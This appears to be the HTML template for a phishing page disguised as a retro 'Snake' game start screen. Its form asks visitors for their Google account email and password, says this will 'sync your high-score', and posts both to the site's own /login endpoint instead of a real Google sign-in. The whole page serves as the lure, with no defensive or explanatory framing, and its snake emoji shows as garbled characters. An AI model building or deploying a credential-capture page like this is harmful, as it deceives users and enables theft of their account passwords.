<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Retro - Start Game</title>
    <style>
        body { background-color: #1a1a1a; color: #00FF00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .game-container { border: 4px solid #00FF00; padding: 30px; border-radius: 10px; background: #000; width: 320px; box-shadow: 0 0 20px #00FF00; text-align: center; }
        .snake-head { font-size: 50px; margin-bottom: 10px; }
        h2 { margin: 0 0 20px; font-size: 22px; letter-spacing: 3px; }
        .error { color: #ff0000; font-size: 12px; margin-bottom: 15px; border: 1px solid #ff0000; padding: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #000; border: 1px solid #00FF00; color: #00FF00; border-radius: 3px; box-sizing: border-box; font-family: inherit; }
        input::placeholder { color: #006600; }
        input:focus { outline: none; background: #0a220a; }
        .start-btn { width: 100%; background: #00FF00; color: #000; padding: 15px; border: none; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        .start-btn:hover { background: #fff; box-shadow: 0 0 15px #fff; }
        .hint { font-size: 10px; color: #555; margin-top: 20px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="game-container">
        <div class="snake-head">üêç</div>
        <h2>SNAKE START</h2>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="GOOGLE ACCOUNT" required autofocus>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button type="submit" class="start-btn">START GAME</button>
        </form>
        
        <div class="hint">Login to sync your high-score</div>
    </div>
</body>
</html>
